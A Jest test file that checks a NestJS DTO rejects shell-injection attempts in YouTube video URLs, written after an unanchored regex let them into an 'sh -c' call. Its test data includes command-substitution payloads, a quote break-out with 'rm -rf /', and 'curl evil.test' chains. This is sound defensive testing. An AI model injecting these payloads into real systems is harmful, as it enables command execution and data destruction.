import { plainToInstance } from 'class-transformer';
import { validateSync } from 'class-validator';
import { CreateJobDto } from './create-job.dto';

/**
 * Validates the DTO exactly as the global ValidationPipe does — same transform,
 * same whitelist — so a payload that passes here is a payload that reaches the
 * controller.
 */
function errorsFor(videoUrl: unknown): string[] {
  const dto = plainToInstance(CreateJobDto, { videoUrl });
  return validateSync(dto, { whitelist: true }).flatMap((e) =>
    Object.values(e.constraints ?? {}),
  );
}

const accepts = (url: string) => expect(errorsFor(url)).toEqual([]);
const rejects = (url: string) =>
  expect(errorsFor(url).length).toBeGreaterThan(0);

describe('CreateJobDto.videoUrl', () => {
  describe('shell injection', () => {
    // Every one of these passed both @IsUrl and @Matches before the regex was
    // anchored, and landed inside a double-quoted `sh -c` string in
    // TranscriptionService. Confirmed by hand against the old pattern.
    it.each([
      ['command substitution', 'https://youtu.be/dQw4w9WgXcQ$(id)'],
      ['backticks', 'https://youtu.be/dQw4w9WgXcQ`id`'],
      [
        'substitution in a query param',
        'https://www.youtube.com/watch?v=dQw4w9WgXcQ&x=$(id)',
      ],
      [
        'substitution in the fragment',
        'https://www.youtube.com/watch?v=dQw4w9WgXcQ#$(id)',
      ],
      ['quote break-out', 'https://youtu.be/dQw4w9WgXcQ" ; rm -rf / ; echo "'],
      ['semicolon chain', 'https://youtu.be/dQw4w9WgXcQ;curl evil.test'],
      ['pipe', 'https://youtu.be/dQw4w9WgXcQ|curl evil.test'],
      ['newline', 'https://youtu.be/dQw4w9WgXcQ\ncurl evil.test'],
      ['backslash', 'https://youtu.be/dQw4w9WgXcQ\\$(id)'],
    ])('rejects %s', (_label, url) => rejects(url));

    it('rejects an absurdly long URL', () => {
      rejects('https://youtu.be/dQw4w9WgXcQ?a=' + 'x'.repeat(300));
    });
  });

  describe('real URLs still work', () => {
    it.each([
      'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
      'https://youtube.com/watch?v=dQw4w9WgXcQ',
      'https://m.youtube.com/watch?v=dQw4w9WgXcQ',
      'https://youtu.be/dQw4w9WgXcQ',
      'https://www.youtube.com/shorts/dQw4w9WgXcQ',
      'https://www.youtube.com/embed/dQw4w9WgXcQ',
      'https://www.youtube.com/live/dQw4w9WgXcQ',
      // The shapes YouTube's own share and autoplay links produce.
      'https://www.youtube.com/watch?v=dQw4w9WgXcQ&t=42s',
      'https://youtu.be/dQw4w9WgXcQ?t=42',
      'https://www.youtube.com/watch?v=dQw4w9WgXcQ&list=RDdQw4w9WgXcQ&start_radio=1',
      'https://www.youtube.com/watch?app=desktop&v=dQw4w9WgXcQ',
    ])('accepts %s', (url) => accepts(url));
  });

  describe('non-YouTube input', () => {
    it.each([
      ['a different host', 'https://vimeo.com/123456789'],
      ['not a URL at all', 'just some text'],
      ['a short id', 'https://youtu.be/tooshort'],
      ['empty', ''],
    ])('rejects %s', (_label, url) => rejects(url));
  });
});
